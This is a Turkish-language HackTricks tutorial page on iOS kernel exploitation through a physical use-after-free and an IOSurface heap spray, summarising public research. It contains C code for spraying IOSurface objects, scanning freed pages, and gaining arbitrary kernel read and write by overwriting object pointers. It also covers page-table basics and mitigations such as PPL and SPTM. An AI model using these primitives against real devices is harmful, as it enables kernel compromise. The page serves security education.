# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Bu, [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) adresindeki gönderiden alınmış bir özet olup, bu tekniği kullanan exploit hakkında daha fazla bilgi için [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd) adresine bakabilirsiniz.

### XNU'da Bellek Yönetimi <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

iOS'taki kullanıcı süreçleri için **sanal bellek adres alanı** **0x0 ile 0x8000000000** arasını kapsar. Ancak bu adresler doğrudan fiziksel belleğe karşılık gelmez. Bunun yerine **kernel**, sanal adresleri gerçek **fiziksel adreslere** çevirmek için **sayfa tabloları** kullanır.

#### iOS'ta Sayfa Tablolarının Seviyeleri

Sayfa tabloları hiyerarşik olarak üç seviyede düzenlenmiştir:

1. **L1 Page Table (Level 1)**:
* Buradaki her giriş sanal belleğin büyük bir aralığını temsil eder.
* **0x1000000000 byte** (veya **256 GB**) sanal belleği kapsar.
2. **L2 Page Table (Level 2)**:
* Buradaki bir giriş, daha küçük bir sanal bellek bölgesini, özellikle **0x2000000 byte** (32 MB) kapsar.
* Bir L1 girişi, tüm bölgeyi kendisi eşleyemiyorsa bir L2 tablosuna işaret edebilir.
3. **L3 Page Table (Level 3)**:
* En ince seviye budur; her giriş tek bir **4 KB** bellek sayfasını eşler.
* Daha ayrıntılı kontrol gerektiğinde bir L2 girişi bir L3 tablosuna işaret edebilir.

#### Sanalden Fiziksele Haritalama

* **Direct Mapping (Block Mapping)**:
* Sayfa tablosundaki bazı girişler, sanal adreslerin bir aralığını bitişik bir fiziksel adres aralığına doğrudan **eşler** (kısayol gibi).
* **Pointer to Child Page Table**:
* Daha ince kontrol gerektiğinde, bir seviyedeki bir giriş (ör. L1) bir alt seviye sayfa tablosuna (ör. L2) işaret edebilir.

#### Sanal Adresin Haritalanmasına Örnek

Örneğin sanal adres **0x1000000000**'a erişmeye çalıştığınızı varsayalım:

1. **L1 Table**:
* kernel, bu sanal adrese karşılık gelen L1 sayfa tablosu girişini kontrol eder. Eğer bir **L2 sayfa tablosuna** işaret ediyorsa, o L2 tablosuna gider.
2. **L2 Table**:
* kernel daha ayrıntılı bir haritalama için L2 sayfa tablosunu denetler. Eğer bu giriş bir **L3 sayfa tablosuna** işaret ediyorsa, oraya ilerler.
3. **L3 Table**:
* kernel son L3 girişini arar; bu giriş gerçek bellek sayfasının **fiziksel adresine** işaret eder.

#### Adres Haritalamaya Örnek

Eğer L2 tablosunun ilk indeksine fiziksel adres **0x800004000** yazarsanız:

* **0x1000000000** ile **0x1002000000** arasındaki sanal adresler, **0x800004000** ile **0x802004000** arasındaki fiziksel adreslere eşlenir.
* Bu, L2 seviyesinde bir **block mapping**'dir.

Alternatif olarak, eğer L2 girişi bir L3 tablosuna işaret ediyorsa:

* **0x1000000000 -> 0x1002000000** sanal adres aralığındaki her 4 KB sayfa, L3 tablosundaki bireysel girişlerle eşlenecektir.

### Physical use-after-free

Bir **physical use-after-free** (UAF) şu durumda ortaya çıkar:

1. Bir süreç belli bir belleği **okunabilir ve yazılabilir** olarak **ayırır** (allocate).
2. Bu belleğe süreç erişebilmesi için **sayfa tabloları**, bu belleği belirli bir fiziksel adrese eşleyecek şekilde güncellenir.
3. Süreç belleği **serbest bırakır** (deallocate/free).
4. Ancak bir **bug** nedeniyle kernel, ilgili fiziksel belleğin serbest olarak işaretlenmesine rağmen sayfa tablosundaki **eşlemeyi kaldırmayı unutabilir**.
5. kernel daha sonra bu "serbest" fiziksel belleği başka amaçlar için, örneğin **kernel verisi** için **yeniden ayırabilir**.
6. Eşleme kaldırılmadığı için süreç hala bu fiziksel belleği **okuyup yazabilir**.

Bu, sürecin **kernel belleği sayfalarına** erişebilmesi anlamına gelir; bu sayfalar hassas veri veya yapılar içerebilir ve saldırganın **kernel belleğini manipüle etmesine** izin verebilir.

### IOSurface Heap Spray

Saldırgan, hangi kernel sayfalarının serbest kalan belleğe atanacağını kontrol edemediği için **heap spray** adı verilen bir teknik kullanır:

1. Saldırgan kernel belleğinde çok sayıda **IOSurface** nesnesi oluşturur.
2. Her IOSurface nesnesi bir alanında kolayca tanımlanabilen bir **magic value** içerir.
3. Serbest bırakılmış sayfaları **tarayarak** bu IOSurface nesnelerinden herhangi birinin serbest sayfaya yerleşip yerleşmediğine bakarlar.
4. Bir serbest sayfada bir IOSurface nesnesi bulduklarında, bunu **kernel belleğini okumak ve yazmak** için kullanabilirler.

Bu konuda daha fazla bilgi için [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups) adresine bakın.

> [!TIP]
> iOS 16+ (A12+) cihazlarının donanım tabanlı mitigasyonlar (PPL veya SPTM gibi) getirdiğini ve bunun fiziksel UAF tekniklerini büyük ölçüde daha az uygulanabilir hale getirdiğini unutmayın.
> PPL, kod imzalama, yetkiler ve hassas kernel verileriyle ilişkili sayfalar üzerinde sıkı MMU korumaları uygular; dolayısıyla bir sayfa yeniden kullanılsa bile userland'den veya ele geçirilmiş kernel kodundan PPL ile korunan sayfalara yazmalar engellenir.
> Secure Page Table Monitor (SPTM), PPL'yi sayfa tablosu güncellemelerini sertleştirerek genişletir. Bu, ayrıcalıklı kernel kodunun bile serbest bırakılmış sayfaları sessizce yeniden eşlemesine veya eşlemeleri kötüye kullanmasına izin vermeyen güvenli kontrollerden geçmesi gerektiğini sağlar.
> KTRR (Kernel Text Read-Only Region), kernel'in kod bölümünü boot sonrası salt okunur olarak kilitler. Bu, runtime sırasında kernel kodu üzerinde yapılacak değişiklikleri engelleyerek fiziksel UAF exploit'lerinin sıklıkla dayandığı önemli bir saldırı vektörünü kapatır.
> Ayrıca, `IOSurface` tahsisleri artık daha az öngörülebilir ve kullanıcı tarafından erişilebilir bölgelere eşlemek zor olduğundan, "magic value tarama" hilesi çok daha az güvenilir hale gelmiştir. Ve `IOSurface` artık entitlements ve sandbox kısıtlamaları ile korunmaktadır.

### Adım Adım Heap Spray Süreci

1. **Spray IOSurface Objects**: Saldırgan özel bir tanımlayıcı ("magic value") ile çok sayıda IOSurface nesnesi oluşturur.
2. **Scan Freed Pages**: Oluşturulan nesnelerden herhangi birinin serbest bırakılmış bir sayfaya yerleşip yerleşmediğini kontrol ederler.
3. **Read/Write Kernel Memory**: IOSurface nesnesindeki alanları manipüle ederek, kernel belleğinde **keyfi okuma ve yazma** yapma yeteneği kazanırlar. Bu sayede:
* Bir alanı kernel belleğindeki herhangi bir 32-bit değeri **okumak** için kullanabilirler.
* Başka bir alanı 64-bit değerleri **yazmak** için kullanarak kararlı bir **kernel read/write primitive** elde edebilirler.

Daha sonra aramak için IOSurface nesnelerini IOSURFACE\_MAGIC sihirli değeriyle oluşturun:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Bir serbest bırakılmış fiziksel sayfadaki **`IOSurface`** nesnelerini ara:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface ile Kernel Okuma/Yazma Elde Etme

Kernel belleğindeki bir IOSurface nesnesi üzerinde kontrol elde ettikten sonra (userspace'ten erişilebilen boşaltılmış bir fiziksel sayfaya eşlenmiş), bunu **arbitrary kernel read and write operations** için kullanabiliriz.

**IOSurface İçindeki Ana Alanlar**

IOSurface nesnesinin iki kritik alanı vardır:

1. **Use Count Pointer**: Bir **32-bit read** sağlar.
2. **Indexed Timestamp Pointer**: Bir **64-bit write** sağlar.

Bu pointer'ları overwrite ederek bunları kernel memory içindeki arbitrary adreslere yönlendiririz ve böylece read/write yetenekleri elde ederiz.

#### 32-Bit Kernel Okuma

Bir okuma gerçekleştirmek için:

1. **use count pointer**'ı hedef adresin 0x14-byte offset eksiğine işaret edecek şekilde overwrite edin.
2. `get_use_count` metodunu kullanarak o adresteki değeri okuyun.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Bir yazma işlemi gerçekleştirmek için:

1. Hedef adrese **indexed timestamp pointer**'ı üzerine yazın.
2. `set_indexed_timestamp` yöntemini kullanarak 64-bit bir değer yazın.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Akışı Özeti

1. **Trigger Physical Use-After-Free**: Boş sayfalar yeniden kullanım için uygun hale gelir.
2. **Spray IOSurface Objects**: Çekirdek bellekte benzersiz bir "magic value" ile çok sayıda IOSurface nesnesi ayırın.
3. **Identify Accessible IOSurface**: Kontrolünüzdeki serbest bırakılmış bir sayfada bir IOSurface bulun.
4. **Abuse Use-After-Free**: IOSurface nesnesindeki pointerları değiştirerek IOSurface yöntemleri aracılığıyla keyfi **kernel read/write** sağlayın.

Bu primitives ile exploit, çekirdek belleğe kontrollü **32-bit reads** ve **64-bit writes** sağlar. İlave jailbreak adımları daha stabil read/write primitives gerektirebilir; bu da ek korumaların atlatılmasını (ör. yeni arm64e cihazlarda PPL) gerektirebilir.

{{#include ../../banners/hacktricks-training.md}}
